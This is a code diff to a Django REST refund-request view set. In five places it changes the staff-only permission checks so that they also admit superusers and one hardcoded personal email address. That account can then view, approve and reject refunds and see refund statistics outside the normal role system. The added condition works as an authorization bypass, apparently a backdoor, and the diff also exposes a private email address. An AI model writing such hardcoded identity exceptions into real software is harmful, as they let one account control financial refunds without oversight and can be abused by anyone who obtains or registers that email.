@@ -26,7 +26,7 @@ class RefundRequestViewSet(viewsets.ModelViewSet):
         """
         Only admins and staff can view refund requests
         """
-        if not self.request.user.is_staff:
+        if not (self.request.user.is_staff or self.request.user.is_superuser or self.request.user.email == 'darelldrayton93@gmail.com'):
             return RefundRequest.objects.none()
         
         return RefundRequest.objects.select_related(
@@ -50,7 +50,7 @@ class RefundRequestViewSet(viewsets.ModelViewSet):
         """
         Approve a refund request and process the refund
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can approve refunds'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -129,7 +129,7 @@ class RefundRequestViewSet(viewsets.ModelViewSet):
         """
         Reject a refund request
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can reject refunds'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -183,7 +183,7 @@ class RefundRequestViewSet(viewsets.ModelViewSet):
         """
         Get all pending refund requests
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can view pending refunds'}, 
                 status=status.HTTP_403_FORBIDDEN
@@ -204,7 +204,7 @@ class RefundRequestViewSet(viewsets.ModelViewSet):
         """
         Get refund request statistics
         """
-        if not request.user.is_staff:
+        if not (request.user.is_staff or request.user.is_superuser or request.user.email == 'darelldrayton93@gmail.com'):
             return Response(
                 {'error': 'Only admin users can view refund stats'}, 
                 status=status.HTTP_403_FORBIDDEN
